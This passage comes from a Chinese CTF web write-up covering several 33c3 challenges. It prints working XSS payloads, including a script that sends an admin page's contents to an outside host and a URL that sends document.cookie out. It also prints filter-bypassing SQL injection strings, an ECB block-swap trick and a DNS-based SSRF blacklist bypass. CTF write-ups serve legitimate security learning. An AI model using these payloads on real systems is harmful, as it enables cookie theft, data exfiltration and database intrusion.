+<p style="max-width:100%;height:auto;">那么我们提交的html如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe id=&amp;apos;1&amp;apos; src=&amp;apos;http://78.46.224.71/?page=leAdminPanel&amp;apos;&gt;
+&lt;/iframe&gt;
+&lt;form action="http://78.46.224.71/?page=login" method="POST" target="profile"&gt;
+    &lt;input name="username" type="text"&gt;
+    &lt;input name="password" type="password"&gt;
+&lt;/form&gt;
+&lt;iframe id=&amp;apos;2&amp;apos; name="profile" src=&amp;apos;http://78.46.224.71/?page=profile&amp;apos;&gt;
+&lt;/iframe&gt;
+&lt;script&gt;
+var xss= "\&lt;script src=&amp;apos;http://104.160.43.154/a.js&amp;apos;\&gt;\&lt;\/script\&gt;";
+$("form input:eq(0)").val(xss);
+$("form input:eq(1)").val(&amp;apos;123&amp;apos;);
+$("form").submit();
+window.top.frames[1].window.location.href=&amp;apos;http://78.46.224.71/?page=profile&amp;apos;;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们的vps上的<code style="max-width:100%;height:auto;">a.js</code>如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">var d = window.top.frames[0].window.document.body.innerHTML;
+$.get(&amp;apos;http://104.160.43.154/xss/?a=&amp;apos;+escape(d),function(data,status){});
+</code></pre>
+<p style="max-width:100%;height:auto;">最后测试的时候估计是服务器的bots关了，不过应该没有什么大问题了把。。要是各位师傅发现什么问题请一定要私信我。。。</p>
+<h2 id="web175shia"><strong>web175 Shia</strong></h2>
+<p style="max-width:100%;height:auto;">这道题很容易先找到这个地方<code style="max-width:100%;height:auto;">http://78.46.224.75/quote/1</code>这个地方，这个地方的1存在注入，试试2和1+1，发现返回一样的，那么也就是说这里是个数字注入点。
+但是经过简单的测试发现空格和很多代表空格的特殊符号都被过滤了，就只剩下<code style="max-width:100%;height:auto;">%0d</code>还可以使用，然后简单测试联合注入的列数</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.75/quote/0%0dorder%0dby%0d3
+http://78.46.224.75/quote/0%0dorder%0dby%0d4
+</code></pre>
+<p style="max-width:100%;height:auto;">发现是3列。
+然后联合注入发现最需要的逗号被过滤了，而且像是union、select都过滤，但是可以双写绕过，那么想到通过子查询联结表来凑齐3列。
+即例如这样子</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.75/quote/0 union select * from (select 11)a join (select 22)b join (select 33)c
+由于过滤改写如下：
+http://78.46.224.75/quote/0%0duniunionon%0dselselectect%0d*%0dfrom%0d(seselectlect%0d11)a%0djoijoinn%0d(selselectect%0d22)b%0djojoinin%0d(seselectlect%0d33)c
+</code></pre>
+<p style="max-width:100%;height:auto;">这样子就能够执行select语句并回显。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/>
+<code style="max-width:100%;height:auto;">22</code>和<code style="max-width:100%;height:auto;">33</code>都回显了。
+所以我们思路继续往下走就是爆破表名列名之类的了。
+然后就遇到了棘手的问题，就是下划线被过滤了。也就是说我们没法儿访问<code style="max-width:100%;height:auto;">information_schema</code>库了。
+这直接影响就是我们没有办法获取到表名和列名了。表名能够猜到是flag，加上提示表一共有4列。可是问题在于我们没有办法知道列名是啥也就很难直接获取flag。
+但是我们知道一个信息就是一共4列，然后想到还是可以用联合查询来代替掉表名，类似与<code style="max-width:100%;height:auto;">webhacking.kr</code>上有个题，我们看下面的例子</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">mysql&gt; create table test(
+    -&gt; id varchar(100),
+    -&gt; name varchar(100));
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; insert into test values(&amp;apos;1&amp;apos;,&amp;apos;name1&amp;apos;),(&amp;apos;2&amp;apos;,&amp;apos;name2&amp;apos;),(&amp;apos;3&amp;apos;,&amp;apos;name3&amp;apos;);
+
+mysql&gt; select i.1,i.2 from (select 1,2 union select * from test)i;
++------+-------+
+| 1    | 2     |
++------+-------+
+| 1    | 2     |
+| 1    | name1 |
+| 2    | name2 |
+| 3    | name3 |
++------+-------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p style="max-width:100%;height:auto;">可以看到我们通过括号里面的<code style="max-width:100%;height:auto;">select 1,2</code>把列名已经换成了1和2，这样在结合联合查询就不需要知道原有列名是啥就能成功获取内容。
+于是这里我们的思路也就是如下：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">union select * from (select 1)a join (select 2)b join (select i.3 from (select 1,2,3,4 union select * from flag)i limit 1)c
+</code></pre>
+<p style="max-width:100%;height:auto;">但是考虑到逗号被过滤了，改写如下:</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">union select * from (select 1)a join (select 2)b join (select i.3 from (select * from (select 1)d join (select 2)f join (select 3)g join (select 4)h union select * from flag)i limit 1)c
+</code></pre>
+<p style="max-width:100%;height:auto;">然后像是<code style="max-width:100%;height:auto;">union</code>，<code style="max-width:100%;height:auto;">select</code>，<code style="max-width:100%;height:auto;">join</code>都需要双写绕过过滤，加上用%0d绕过对空格的过滤，最后的payload：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">0%0duniounionn%0dseselectlect%0d*%0dfrom%0d(seselectlect%0d1)a%0djoijoinn%0d(seselectlect%0d2)b%0djoijoinn%0d(seselectlect%0di.3%0dfrom%0d(seselectlect%0d*%0dfrom%0d(seselectlect%0d1)d%0djoijoinn%0d(seselectlect%0d2)f%0djoijoinn%0d(seselectlect%0d3)g%0djoijoinn%0d(seselectlect%0d4)h%0duniounionn%0dseselectlect%0d*%0dfrom%0dflag)i%0dlimit%0d1%0doffset%0d5)c
+</code></pre>
+<p style="max-width:100%;height:auto;">注意调整limit和offset的值，因为这里逗号被过滤所以使用offset来代替逗号的功能，
+截图如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web150try"><strong>web150 try</strong></h2>
+<p style="max-width:100%;height:auto;">应该是一道上传执行的题，但是不想做了。。。所以跳过了</p>
+<h2 id="web200pwn2win"><strong>web200 pwn2win</strong></h2>
+<p style="max-width:100%;height:auto;">在买cheap的时候重定向这里有一串字符</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/>
+多次购买发现字符有些地方不变有些地方是一直在变的，但是可以看出，买cheap的时候开头结尾的一部分值是不变的，猜想这里是被加密的，加上观察这段密文应该是被hex过的，也就是密文只有48位，所以猜想应该是某种加密方式，而且关键是中间部分一直在变化但是尾部并没有变，也就是说应该是ebc模式编码，那么随便用买cheap成功的不不变的部分替换买flag的对应部分，结果把结尾替换下就能成功买下flag</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">232c66210158dfb23a2eda5cc945a0a9 650c1ed0fa0a08f6 cc790d4c646aafed 9a216475b31628522f7ef761e2bbe791 //买flag 失败
+5765679f0870f4309b1a3c83588024d7 c146a4104cf9d2c8 b6e54d0a1b1b7a4e 28df361f896eb3c3706cda0474915040 //买cheap 成功
+5765679f0870f4309b1a3c83588024d7 650c1ed0fa0a08f6 ddfc2c4ea92045bd 9a216475b31628522f7ef761e2bbe791 //买flag 成功
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web250yoso"><strong>web250 YOSO</strong></h2>
+<p style="max-width:100%;height:auto;">首先简单看看这个网页的功能，
+大概就是可以向admi发送一个链接。
+然后就是可以下载搜索的的书签等等，
+初步猜想也是一道xss，然后想办法获取管理员的cookie，
+然后下载书签这里<code style="max-width:100%;height:auto;">download.php</code>存在参数<code style="max-width:100%;height:auto;">zip</code>
+而且没有过滤。</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.80:1337/download.php?zip=%3Cscript%3Ealert(%22hello%20world%22)%3C/script%3E
+</code></pre>
+<p style="max-width:100%;height:auto;">测试弹窗成功
+那么直接开始构造拿管理员cookie，之后直接登陆下载书签即可。
+payload如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.80:1337/download.php?zip=%3Cscript%3Ewindow.location.href=%22http://104.160.43.154/xss/?a=%22+document.cookie%3C/script%3E
+</code></pre>
+<h2 id="web400list0r"><strong>web400 list0r</strong></h2>
+<p style="max-width:100%;height:auto;">首先随便注册登陆下，没发现什么有用的东西，然后用admin:admin登陆，发现登陆成功了，在里面得到hint说是flag在<code style="max-width:100%;height:auto;">/reeeaally/reallyy/c00l/and_aw3sme_flag</code>下。
+直接访问不行。
+再回去看看有没有什么遗漏的地方。
+发现page参数有点诡异，有点像文件包含，试了试果然是文件包含，那么顺势用<code style="max-width:100%;height:auto;">php://</code>把所有的源码拿下来
+接下来就是代码审计，
+既然有文件包含，加上profile出有上传文件，那么初步想法是上传图片马包含，看<code style="max-width:100%;height:auto;">profile.php</code>上传点：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">require_login();
+
+if (isset($_POST["fname"]) or isset($_POST["lname"]) or isset($_POST["bio"]) or isset($_POST["pic"])) {
+    $pic_name = NULL;
+    if (isset($_POST["pic"]) &amp;&amp; $_POST["pic"] != "" &amp;&amp; !is_admin()) {
+        $pic = get_contents($_POST["pic"]);
+        if (!is_image($pic)) {
+            die("&lt;p&gt;&lt;h3 style=color:red&gt;Does this look like an image to you???????? people are dumb these days...&lt;/h3&gt;&lt;/p&gt;" . htmlspecialchars($pic));
+        } else {
+            $pic_name = "profiles/" . sha1(rand());
+            file_put_contents($pic_name, $pic);
+        }
+    }
+......
+......
+</code></pre>
+<p style="max-width:100%;height:auto;">发现上传后文件被重命名了，而且没有后缀
+<code style="max-width:100%;height:auto;">index.php</code>包含文件代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+if (isset($_GET["page"])) {
+    include $_GET["page"] . ".php";
+} else if (logged_in()) {
+    $lists = get_lists();
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">后来发现没有办法截断php，那么这种上传包含的想法作罢。
+再看看别的地方。
+发现这里上传点的处理不同，因为这里的上传不是单纯的传文件，而是给它一个链接，服务器去链接上去内容，
+那么也就想到了直接让服务器把<code style="max-width:100%;height:auto;">/reeeaally/reallyy/c00l/and_aw3sme_flag</code>的内容取出来。
+看看它的<code style="max-width:100%;height:auto;">get_contents()</code>函数如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function get_contents($url) {
+        $disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];
+
+        do {
+            $url_parts = parse_url($url);
+
+            if (!array_key_exists("host", $url_parts)) {
+                die("&lt;p&gt;&lt;h3 style=color:red&gt;There was no host in your url!&lt;/h3&gt;&lt;/p&gt;");
+            }
+
+            $host = $url_parts["host"];
+
+            if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+                $ip = $host;
+            } else {
+                $ip = dns_get_record($host, DNS_A);
+                if (count($ip) &gt; 0) {
+                    $ip = $ip[0]["ip"];
+                    debug("Resolved to {$ip}");
+                } else {
+                    die("&lt;p&gt;&lt;h3 style=color:red&gt;Your host couldn&amp;apos;t be resolved man...&lt;/h3&gt;&lt;/p&gt;");
+                }
+            }
+
+            foreach ($disallowed_cidrs as $cidr) {
+                if (in_cidr($cidr, $ip)) {
+                    die("&lt;p&gt;&lt;h3 style=color:red&gt;That IP is a blacklisted cidr ({$cidr})!&lt;/h3&gt;&lt;/p&gt;");
+                }
+            }
+
+            // all good, curl now
+            debug("Curling {$url}");
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
+            curl_setopt($curl, CURLOPT_TIMEOUT, 3);
+            curl_setopt($curl, CURLOPT_PROTOCOLS, CURLPROTO_ALL
+                &amp; ~CURLPROTO_FILE
+                &amp; ~CURLPROTO_SCP); // no files plzzz
+            curl_setopt($curl, CURLOPT_RESOLVE, array($host.":".$ip)); // no dns rebinding plzzz
+
+            $data = curl_exec($curl);
+
+            if (!$data) {
+                die("&lt;p&gt;&lt;h3 style=color:red&gt;something went wrong....&lt;/h3&gt;&lt;/p&gt;");
+            }
+
+            if (curl_error($curl) &amp;&amp; strpos(curl_error($curl), "timed out")) {
+                die("&lt;p&gt;&lt;h3 style=color:red&gt;Timeout!! thats a slowass  server&lt;/h3&gt;&lt;/p&gt;");
+            }
+
+            // check for redirects
+            $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+            if ($status &gt;= 301 and $status &lt;= 308) {
+                $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
+            } else {
+                return $data;
+            }
+
+        } while (1);
+    }
+</code></pre>
+<p style="max-width:100%;height:auto;">发现它对ip进行了限制，而且如果你传的是域名，它会先解析，在判断。
+那么这里有个思路就是调整dns的解析，什么意思呢？
+我们知道，当一条dns对应多个ip的时候，解析是随机的。
+我对我的域名的解析调整如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">将一个域名对应到两个ip上，那么</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">可以看出随机返回一条解析记录。
+那么也就是说，我们多次提交如下链接：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://bendawang.site/reeeaally/reallyy/c00l/and_aw3sme_flag
+</code></pre>
+<p style="max-width:100%;height:auto;">当服务器在判断黑名单的时候如果把<code style="max-width:100%;height:auto;">bendawang.site</code>解析为<code style="max-width:100%;height:auto;">104.160.43.154</code>，而在获取内容的时候解析为<code style="max-width:100%;height:auto;">127.0.0.1</code>，那么我们就能成功获取flag。
+接下来就是不断的提交，试了有5、6次之后顺利拿到flag如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./33c3-CTF-web-WriteUp/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./33c3-CTF-web-WriteUp/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./33c3-CTF-web-WriteUp/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./33c3-CTF-web-WriteUp/prism.js"></script>
+<script src="./33c3-CTF-web-WriteUp/zooming.js"></script>
+<script src="./33c3-CTF-web-WriteUp/Bendawang.js"></script>
+
+
